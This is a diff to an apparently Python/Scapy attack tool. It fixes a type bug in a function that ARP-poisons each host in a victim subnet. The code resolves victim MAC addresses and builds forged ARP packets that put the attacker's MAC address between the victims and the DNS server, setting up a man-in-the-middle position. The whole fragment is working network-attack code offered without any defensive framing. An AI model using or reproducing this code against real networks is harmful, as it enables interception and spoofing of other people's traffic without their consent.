@@ -34,7 +34,7 @@ def arp():
 	for victim in victims.hosts():
 
 		# Get the victim MAC address
-		arp_resolver_package_victim = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victim)
+		arp_resolver_package_victim = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=str(victim))
 		mac_victim = srp(arp_resolver_package_victim, timeout=2, verbose=False)
 		
 		# If mac addr is not found then consider that victim is offline, don't treat the victim
@@ -43,8 +43,8 @@ def arp():
 			mac_victim = mac_victim[0][0][1].hwsrc
 
 			#creation of ARP poisoning packets
-			p1 = Ether(dst=mac_victim) / ARP(op=1, hwsrc=self_mac, psrc=ATTACK_STATUS['dns'], hwdst="00:00:00:00:00:00", pdst=victim);
-			p2 = Ether(dst=mac_dns) / ARP(op=1, hwsrc=self_mac, psrc=victim, hwdst="00:00:00:00:00:00", pdst=ATTACK_STATUS['dns']);
+			p1 = Ether(dst=mac_victim) / ARP(op=1, hwsrc=self_mac, psrc=ATTACK_STATUS['dns'], hwdst="00:00:00:00:00:00", pdst=str(victim));
+			p2 = Ether(dst=mac_dns) / ARP(op=1, hwsrc=self_mac, psrc=str(victim), hwdst="00:00:00:00:00:00", pdst=ATTACK_STATUS['dns']);
 
 			packets.append(p1)
 			packets.append(p2)
